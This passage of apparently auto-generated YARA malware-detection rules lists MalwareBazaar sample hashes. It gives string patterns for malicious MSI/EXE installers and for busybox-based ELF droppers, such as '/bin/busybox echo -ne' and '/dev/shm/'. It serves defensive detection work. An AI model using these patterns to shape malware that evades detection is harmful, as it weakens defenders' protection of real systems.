b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe, be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi, ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi, cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891.msi, d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd.msi, e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi, f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219"
      hash2 = "3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5"
      hash3 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
      hash4 = "4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312"
      hash5 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
      hash6 = "50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b"
      hash7 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
      hash8 = "635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a"
      hash9 = "637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61"
      hash10 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
      hash11 = "67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73"
      hash12 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
      hash13 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
      hash14 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
      hash15 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
      hash16 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
      hash17 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
      hash18 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
      hash19 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
      hash20 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
      hash21 = "cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891"
      hash22 = "d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd"
      hash23 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
      hash24 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $s1 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s2 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s3 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s4 = "IdentifierName of tableName of columnY;NWhether the column is nullableYMinimum value allowedMaximum value allowedFor foreign key" ascii
      $s5 = "get_frame" fullword ascii
      $s6 = "anguage;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;AnyPath;WildCardFilename;RegPath;CustomSource;Property;Cabinet;Shor" ascii
      $s7 = "tcut;FormattedSDDLText;Integer;DoubleInteger;TimeDate;DefaultDirString categoryTextSet of values that are permittedDescription o" ascii
      $s8 = " which skips the action if evaluates to expFalse.If the expression syntax is invalid, the engine will terminate, returning iesBa" ascii
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 27000KB and ( all of them )
      ) or ( all of them )
}

rule _412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c_8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663_22 {
   meta:
      description = "evidences - from files 412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c.elf, 8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f.elf, a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e.elf, b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09.elf, d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c"
      hash2 = "8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f"
      hash3 = "a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e"
      hash4 = "b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09"
      hash5 = "d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9"
   strings:
      $s1 = "/bin/busybox echo -ne " fullword ascii
      $s2 = "usage: busybox" fullword ascii
      $s3 = "/var/run/" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "/var/tmp/" fullword ascii
      $s5 = "/home/" fullword ascii /* Goodware String - occured 2 times */
      $s6 = "/boot/" fullword ascii
      $s7 = "/dev/shm/" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( all of them )
      ) or ( all of them )
}
